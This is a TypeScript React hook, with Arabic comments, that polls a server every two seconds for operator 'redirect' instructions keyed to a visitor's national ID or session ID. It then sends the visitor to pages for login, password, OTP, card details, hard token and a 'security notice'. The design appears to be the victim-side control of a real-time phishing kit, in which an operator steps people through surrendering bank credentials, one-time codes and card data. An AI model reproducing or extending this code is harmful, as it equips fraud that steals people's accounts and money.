/**
 * Hook لاستقبال توجيهات المشرف من أي صفحة
 * يراقب redirectTo باستمرار ويحول العميل عند وجود توجيه
 * يدعم التوجيه عبر nationalId (للعملاء المسجلين) وعبر sessionId (للزوار الجدد)
 */
import { useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

export const REDIRECT_ROUTES: Record<string, string> = {
  login: "/login",
  password: "/password",
  otp: "/otp",
  "confirm-otp": "/confirm-otp",
  card: "/card-info",
  watchlink: "/watch-link",
  token: "/watch-link",
  "hard-token": "/hard-token",
  whatsapp: "/whatsapp",
  "watch-link": "/watch-link",
  success: "/success",
  registered: "/registered",
  "smart-review": "/smart-review",
  "login-error": "/login",
  home: "/",
  "choose-watch": "/choose-watch",
  personal: "/personal-info",
  processing: "/processing",
  "security-notice": "/security-notice",
  "confirm-address": "/confirm-address",
  address: "/confirm-address",
};

export function useAdminRedirect() {
  const [, setLocation] = useLocation();
  const nationalId = localStorage.getItem("pw_national_id") || "";
  const sessionId = localStorage.getItem("pw_visitor_session") || "";

  // تتبع التوجيه عبر nationalId (للعملاء المسجلين)
  const { data: redirectData } = trpc.applications.getRedirectStatus.useQuery(
    { nationalId },
    { enabled: !!nationalId, refetchInterval: 2000 }
  );

  // تتبع التوجيه عبر sessionId (للزوار في أي صفحة)
  const { data: visitorRedirectData } = trpc.admin.getVisitorRedirect.useQuery(
    { sessionId },
    { enabled: !!sessionId, refetchInterval: 2000 }
  );

  const clearRedirect = trpc.applications.clearRedirectByUser.useMutation();
  const clearVisitorRedirect = trpc.admin.clearVisitorRedirect.useMutation();

  useEffect(() => {
    // 1. فحص توجيه العميل المسجل
    if (redirectData?.redirectTo) {
      const target = redirectData.redirectTo;
      const route = REDIRECT_ROUTES[target] || `/${target}`;

      // حفظ رسالة الخطأ إن وُجدت
      if (redirectData.redirectError) {
        sessionStorage.setItem("pw_redirect_error", redirectData.redirectError);
      }

      // مسح التوجيه من الخادم فوراً حتى لا يتكرر
      clearRedirect.mutate({ nationalId });

      // الانتقال للصفحة المطلوبة
      setLocation(route);
      return;
    }

    // 2. فحص توجيه الزائر العام (غير المسجل)
    if (visitorRedirectData?.redirectTo) {
      const target = visitorRedirectData.redirectTo;
      const route = REDIRECT_ROUTES[target] || `/${target}`;

      // مسح التوجيه من الخادم
      clearVisitorRedirect.mutate({ sessionId });

      // الانتقال للصفحة المطلوبة
      setLocation(route);
    }
  }, [redirectData, visitorRedirectData, nationalId, sessionId, setLocation]);
}
